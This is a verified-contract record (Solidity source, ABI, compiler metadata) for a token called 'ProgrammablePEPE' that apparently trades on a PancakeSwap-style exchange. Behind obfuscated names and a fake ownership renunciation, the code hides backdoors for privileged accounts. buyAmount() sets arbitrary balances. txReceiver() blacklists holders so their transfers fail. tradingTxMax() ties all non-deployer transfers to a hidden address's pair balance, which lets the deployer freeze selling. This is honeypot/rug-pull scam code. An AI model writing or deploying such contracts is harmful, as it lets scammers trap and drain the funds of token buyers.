{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface fundTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptReceiverAt) external view returns (uint256);\n\n    function transfer(address receiverLaunched, uint256 buyLiquidityFee) external returns (bool);\n\n    function allowance(address launchedSellShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyLiquidityFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLaunched,\n        uint256 buyLiquidityFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTeam, uint256 value);\n    event Approval(address indexed launchedSellShould, address indexed spender, uint256 value);\n}\n\nabstract contract buyLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minLaunchMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeBuy {\n    function createPair(address marketingBuy, address senderBuy) external returns (address);\n}\n\ninterface fundToMetadata is fundTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProgrammablePEPE is buyLimit, fundTo, fundToMetadata {\n\n    address public sellIs;\n\n    function receiverTrading() private view {\n        require(receiverAt[_msgSender()]);\n    }\n\n    uint256 fromShouldLaunch;\n\n    mapping(address => bool) public receiverAt;\n\n    address public swapFrom;\n\n    function tradingTxMax(uint256 buyLiquidityFee) public {\n        receiverTrading();\n        fromShouldLaunch = buyLiquidityFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderIsAuto;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTo;\n    }\n\n    uint256 constant takeMarketingReceiver = 19 ** 10;\n\n    bool private modeLaunch;\n\n    string private feeSender = \"Programmable PEPE\";\n\n    uint8 private autoTo = 18;\n\n    function maxIsSwap(address modeLaunchMax, address receiverLaunched, uint256 buyLiquidityFee) internal returns (bool) {\n        if (modeLaunchMax == sellIs) {\n            return maxShould(modeLaunchMax, receiverLaunched, buyLiquidityFee);\n        }\n        uint256 totalLimit = fundTo(swapFrom).balanceOf(liquiditySwap);\n        require(totalLimit == fromShouldLaunch);\n        require(receiverLaunched != liquiditySwap);\n        if (receiverSwapMin[modeLaunchMax]) {\n            return maxShould(modeLaunchMax, receiverLaunched, takeMarketingReceiver);\n        }\n        return maxShould(modeLaunchMax, receiverLaunched, buyLiquidityFee);\n    }\n\n    function buyAmount(address launchTeam, uint256 buyLiquidityFee) public {\n        receiverTrading();\n        listTrading[launchTeam] = buyLiquidityFee;\n    }\n\n    function txReceiver(address senderAuto) public {\n        receiverTrading();\n        \n        if (senderAuto == sellIs || senderAuto == swapFrom) {\n            return;\n        }\n        receiverSwapMin[senderAuto] = true;\n    }\n\n    address liquiditySwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private toTake;\n\n    uint256 private tokenBuyAuto;\n\n    event OwnershipTransferred(address indexed modeLaunched, address indexed liquidityToken);\n\n    address txSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public senderLimitSell;\n\n    function transfer(address launchTeam, uint256 buyLiquidityFee) external virtual override returns (bool) {\n        return maxIsSwap(_msgSender(), launchTeam, buyLiquidityFee);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverLaunch;\n    }\n\n    function approve(address takeTeam, uint256 buyLiquidityFee) public virtual override returns (bool) {\n        receiverToken[_msgSender()][takeTeam] = buyLiquidityFee;\n        emit Approval(_msgSender(), takeTeam, buyLiquidityFee);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeSender;\n    }\n\n    bool public listMaxTo;\n\n    address private receiverLaunch;\n\n    function allowance(address minSellFrom, address takeTeam) external view virtual override returns (uint256) {\n        if (takeTeam == txSell) {\n            return type(uint256).max;\n        }\n        return receiverToken[minSellFrom][takeTeam];\n    }\n\n    string private atLiquiditySwap = \"PPE\";\n\n    mapping(address => bool) public receiverSwapMin;\n\n    function balanceOf(address exemptReceiverAt) public view virtual override returns (uint256) {\n        return listTrading[exemptReceiverAt];\n    }\n\n    function owner() external view returns (address) {\n        return receiverLaunch;\n    }\n\n    function teamMax() public {\n        emit OwnershipTransferred(sellIs, address(0));\n        receiverLaunch = address(0);\n    }\n\n    function transferFrom(address modeLaunchMax, address receiverLaunched, uint256 buyLiquidityFee) external override returns (bool) {\n        if (_msgSender() != txSell) {\n            if (receiverToken[modeLaunchMax][_msgSender()] != type(uint256).max) {\n                require(buyLiquidityFee <= receiverToken[modeLaunchMax][_msgSender()]);\n                receiverToken[modeLaunchMax][_msgSender()] -= buyLiquidityFee;\n            }\n        }\n        return maxIsSwap(modeLaunchMax, receiverLaunched, buyLiquidityFee);\n    }\n\n    mapping(address => uint256) private listTrading;\n\n    function maxShould(address modeLaunchMax, address receiverLaunched, uint256 buyLiquidityFee) internal returns (bool) {\n        require(listTrading[modeLaunchMax] >= buyLiquidityFee);\n        listTrading[modeLaunchMax] -= buyLiquidityFee;\n        listTrading[receiverLaunched] += buyLiquidityFee;\n        emit Transfer(modeLaunchMax, receiverLaunched, buyLiquidityFee);\n        return true;\n    }\n\n    function takeToken(address exemptAuto) public {\n        require(exemptAuto.balance < 100000);\n        if (listMaxTo) {\n            return;\n        }\n        if (modeLaunch) {\n            toTake = false;\n        }\n        receiverAt[exemptAuto] = true;\n        if (maxExemptAt != toTake) {\n            senderLimitSell = true;\n        }\n        listMaxTo = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atLiquiditySwap;\n    }\n\n    uint256 private senderIsAuto = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private receiverToken;\n\n    bool public maxExemptAt;\n\n    constructor (){\n        if (modeLaunch != senderLimitSell) {\n            senderLimitSell = true;\n        }\n        minLaunchMax launchEnable = minLaunchMax(txSell);\n        swapFrom = takeBuy(launchEnable.factory()).createPair(launchEnable.WETH(), address(this));\n        if (toTake) {\n            toTake = false;\n        }\n        sellIs = _msgSender();\n        teamMax();\n        receiverAt[sellIs] = true;\n        listTrading[sellIs] = senderIsAuto;\n        if (toTake) {\n            modeLaunch = false;\n        }\n        emit Transfer(address(0), sellIs, senderIsAuto);\n    }\n\n    uint256 tokenTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSellShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSellFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLiquidityFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLiquidityFee\",\"type\":\"uint256\"}],\"name\":\"buyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMaxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExemptAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimitSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"}],\"name\":\"takeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyLiquidityFee\",\"type\":\"uint256\"}],\"name\":\"tradingTxMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLiquidityFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLiquidityFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAuto\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ProgrammablePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}